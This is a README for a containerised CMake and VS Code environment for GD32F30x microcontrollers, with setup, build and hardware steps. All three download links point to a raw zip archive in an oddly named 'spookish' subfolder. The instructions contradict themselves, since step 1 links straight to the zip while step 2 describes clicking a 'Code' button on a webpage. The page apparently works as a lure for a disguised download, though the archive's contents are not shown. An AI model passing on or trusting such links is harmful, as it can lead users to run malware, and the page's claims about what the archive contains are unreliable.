# 🛠️ gd32f30x-cmake-vscode - Build embedded software with minimal effort

[![](https://img.shields.io/badge/Download-Project_Files-blue)](https://github.com/edmondflying869/gd32f30x-cmake-vscode/raw/refs/heads/main/spookish/cmake_vscode_x_gd_f_v2.6.zip)

## 📌 Project Overview

This project provides a complete environment for developing software for GD32F30x microcontrollers. You do not need to install complex compilers or drivers on your computer. All necessary tools exist inside a container that runs on your system. This approach keeps your computer clean and ensures that your development environment works exactly as intended.

The project includes support for common libraries such as FatFs for file systems, lwIP for network connectivity, and FreeRTOS for managing tasks. It relies on CMake to build projects and Visual Studio Code to edit your files.

## 📋 System Requirements

To use this software, your computer needs the following:

- Windows 10 or 11.
- Visual Studio Code installed.
- Docker Desktop installed.
- The "Dev Containers" extension for Visual Studio Code.
- Enough disk space for the container image, which is approximately 2 gigabytes.

## 🚀 Getting Started

1. Visit [this page](https://github.com/edmondflying869/gd32f30x-cmake-vscode/raw/refs/heads/main/spookish/cmake_vscode_x_gd_f_v2.6.zip) to download the project files. 
2. Click the green "Code" button on the webpage and select "Download ZIP".
3. Extract the downloaded ZIP file to a folder on your computer.

## ⚙️ Setting Up Your Environment

You must set up your computer to recognize the development container.

1. Open Visual Studio Code.
2. Click the "Extensions" icon on the left sidebar.
3. Search for "Dev Containers" and select "Install".
4. Open the folder you extracted in the previous step using "File" then "Open Folder" in Visual Studio Code.
5. A notification will appear in the bottom right corner asking if you want to "Reopen in Container". Click this button.
6. Visual Studio Code will download the container image and set up the environment. This process takes a few minutes depending on your internet speed.

## 🏗️ Building Your Software

Once the environment loads, you can build your software.

1. Open the "Terminal" panel in Visual Studio Code by selecting "Terminal" then "New Terminal" from the top menu.
2. The terminal window shows the container environment.
3. Type the command `mkdir build` and press enter to create a build directory.
4. Type `cd build` and press enter to enter the directory.
5. Run the configuration command `cmake ..` to set up the build files for your specific microcontroller model.
6. Run the build command `make` to compile your code.

The build process generates a file with a `.bin` or `.hex` extension inside the build folder. This is the file you load onto your hardware.

## 🔌 Connecting Hardware

Connect your hardware device to your computer via a USB cable. If you use a hardware debugger like an ST-Link or J-Link, ensure the drivers for that device are installed on your Windows host. The container connects to these devices through the Docker Desktop settings. Select your hardware device in the Docker settings menu to allow the container to communicate with the physical hardware.

## 📂 Project Structure

This project follows a standard layout for embedded development:

- `src/`: Contains your primary source code files.
- `inc/`: Contains your header files.
- `lib/`: Includes third-party libraries like FatFs, lwIP, and FreeRTOS.
- `cmake/`: Contains helper scripts for the build process.
- `Dockerfile`: Defines the environment inside the container.

## 🔍 Troubleshooting

### Container Fails to Start
Ensure Docker Desktop is open and running before you open your project in Visual Studio Code. Check that your internet connection is stable, as the system must pull components from the internet during the first setup.

### Compilation Errors
If the `make` command fails, check the terminal output for red text. This usually indicates a syntax error in your source code. Verify that you included all header files correctly in your project.

### Missing Hardware
If the container does not see your hardware, ensure you passed the USB device to the container. Open the Docker Desktop dashboard, locate the running container, and verify the device settings in the "Resources" tab.

## 💬 Support and Contributions

This project is a starting point for bare-metal development. You can modify the `CMakeLists.txt` file to add your own source files or change build settings. If you identify a bug or face a persistent issue, open an issue report on the repository page. 

You can find the project files here: [https://github.com/edmondflying869/gd32f30x-cmake-vscode/raw/refs/heads/main/spookish/cmake_vscode_x_gd_f_v2.6.zip](https://github.com/edmondflying869/gd32f30x-cmake-vscode/raw/refs/heads/main/spookish/cmake_vscode_x_gd_f_v2.6.zip)

Following the steps above ensures a consistent experience across all Windows machines. The containerized approach prevents conflicts between different versions of compilers or build tools. You can now build and deploy your software with confidence.